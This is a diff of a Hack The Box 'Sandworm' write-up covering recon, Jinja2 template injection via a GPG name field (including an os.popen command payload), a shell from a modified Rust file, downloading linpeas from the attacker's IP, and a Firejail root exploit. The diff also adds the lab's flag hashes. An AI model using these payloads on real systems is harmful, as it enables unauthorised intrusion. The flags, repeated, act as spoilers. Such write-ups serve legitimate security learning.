@@ -1,14 +1,7 @@
----
-title: Hack The Box - Sandworm
-date: 2024-06-21 13:33:37 +0200
-categories:
-  - HackTheBox
-tags:
-  - HTB
-comments: true
----
 
 HTB Sandworm Machine - https://www.hackthebox.com/machines/sandworm
+
+### 06/05/2024
 
 ### Scanning & Enumeration
 Scan the machine with Nmap tool
@@ -16,14 +9,14 @@ Scan the machine with Nmap tool
 nmap -p- -sC -sV --min-rate 5000 -oN nmappc -Pn 10.10.11.218
 ```
 
-![](/assets/img/posts/Pasted image 20260820075359.png)
+![](/assets/img/posts/Pasted%20image%2020260820075359.png)
 
 Found a hostname `ssa.htb` , so add it to the: `/etc/hosts` file
 	`10.10.11.218 ssa.htb`
 
 Lets navigate to it. Nothing Interesting here in this Page. 
 
-![](/assets/img/posts/Pasted image 20260820085836.png)
+![](/assets/img/posts/Pasted%20image%2020260820085836.png)
 
 So I start to look for hidden directories/files a with common wordlist.
 ```
@@ -35,7 +28,7 @@ I found `admin` page but no Credentials. and I found `guide` page Interesting.
 ### Exploitation & Gaining Access
 There is a **Public Key** and **Signed Text** field. It takes **gpg key value** and **signed text** verified with that Key and it will Verify Signature.
 
-![](/assets/img/posts/Pasted image 20250816235636.png)
+![[Pasted image 20250816235636.png]]
 
 So now we have to generate a gpg key with command line.
 ```
@@ -43,9 +36,9 @@ gpg --gen-key
 ```
 
 #### First Try
-Try SSTI in real name field is vulnerable to SSTI (Server Side Template Injection). So for testing I put This SSTI payload in the name field. If it is vulnerable then it will give output `49` as a name.
+Try SSTI in real name field is vulnerable to SSTI (Server Side Template Injection). So for testing I put `{{7*7}} `payload in the name field. If it is vulnerable then it will give output `49` as a name.
 ```
-Real name: {{7*7}}
+Real name: {{7\*7}}
 Email: anymail
 password: A1234567
 ```
@@ -75,16 +68,16 @@ password: A1234567
 
 This is my Public Key:
 
-![](/assets/img/posts/Pasted image 20260820090812.png)
+![](/assets/img/posts/Pasted%20image%2020260820090812.png)
 
 
 This is my Signed Text:
 
-![](/assets/img/posts/Pasted image 20260820090855.png)
+![](/assets/img/posts/Pasted%20image%2020260820090855.png)
 
 After putting this two Content into the Proper Field I press on Verify Signature and I found this below.
 
-![](/assets/img/posts/Pasted image 20250816235814.png)
+![[Pasted image 20250816235814.png]]
 
 I found **49** It is **jinja2** template engine. So it worked and it is exploitable.
 
@@ -103,7 +96,7 @@ Then I again generate keys but this time the payload will be different. In the n
 #### Second Try
 ```
 gpg --gen-key
-Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+Real name: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 Email: abdo@gmail.com
 password: A1234567
 ```
@@ -121,11 +114,11 @@ Password: A1234567
 ```
 
 After making and putting those in input field I get the UID of user `atlas`.
-![](/assets/img/posts/Pasted image 20250817000027.png)
+![[Pasted image 20250817000027.png]]
 
 Then I change the `id` command with a reverse shell command but it shows Error. Not supporting `< >`.
 
-![](/assets/img/posts/Pasted image 20260820091504.png)
+![](/assets/img/posts/Pasted%20image%2020260820091504.png)
 
 Removing the previous keys
 ```
@@ -193,7 +186,7 @@ We will finally arrived to this file
 cat admin.json
 ```
 
-![](/assets/img/posts/Pasted image 20260820092658.png)
+![](/assets/img/posts/Pasted%20image%2020260820092658.png)
 
 
 So now we have a username, and  a password
@@ -205,7 +198,7 @@ Password: quietLiketheWind22
 
 silentobserver@sandworm:~$ whoami
 silentobserver@sandworm:~$ ls
-silentobserver@sandworm:~$ cat user.txt
+silentobserver@sandworm:~$ cat user.txt           # bc9d7d02107e9efd57b4a9f84a01707b
 ```
 
 #### 1- Using pspy Script
@@ -231,7 +224,7 @@ silentobserver@sandworm:~$ ls -lah
 silentobserver@sandworm:~$ cat tipnet.d
 ```
 
-![](/assets/img/posts/Pasted image 20260820095823.png)
+![](/assets/img/posts/Pasted%20image%2020260820095823.png)
 
 I found one of them has write Access. So I change the code with some shell code: https://doc.rust-lang.org/std/process/struct.Command.html
 ```
@@ -243,13 +236,13 @@ let output = Command::new("bash")
 .expect("failed to execute process")
 ```
 
-![](/assets/img/posts/Pasted image 20260820100111.png)
+![](/assets/img/posts/Pasted%20image%2020260820100111.png)
 
 Setting our netcat listener, and get shell again with `Atlas` User.
 
 Here in `.ssh` folder I put my own `id_rsa.pub `file and rename it again with `authorized_keys` , then I use my own `id_rsa` to login as Atlas User.
 
-![](/assets/img/posts/Pasted image 20260820100407.png)
+![](/assets/img/posts/Pasted%20image%2020260820100407.png)
 
 #### 2- Using linpeas.sh Script
 This time we will use `linpeas.sh` script to see if there anything we can use it to get to the root, but first lets download it to the HTB machine
@@ -266,7 +259,7 @@ silentobserver@sandworm:~$ wget 10.10.16.17:8000/linpeas.sh
 
 When I run linpeas.sh I found the following interesting file.
 
-![](/assets/img/posts/Pasted image 20250817000428.png)
+![[Pasted image 20250817000428.png]]
 
 It has SUID permission. So we can use that for Exploitation. I search in **Google** for `Firejail exploit.` , I found this: https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25
 
@@ -277,7 +270,7 @@ silentobserver@sandworm:~$ chmod +x fire-explit.py
 silentobserver@sandworm:~$ python3 fire-explit.py
 ```
 
-![](/assets/img/posts/Pasted image 20260820095203.png)
+![](/assets/img/posts/Pasted%20image%2020260820095203.png)
 
 So I again open a shell as `atlas` user using SSH and `id_rsa`. And type the following command
 ```
@@ -285,5 +278,5 @@ atlas@sandworm:/opt/tipnet$ firejail --join=24654
 atlas@sandworm:/opt/tipnet$ su -
 root@sandworm:~#
 root@sandworm:~# cd /root
-root@sandworm:~# cat root.txt
+root@sandworm:~# cat root.txt         # f24df2047eb6b877417c8a43ee71d54b
 ```
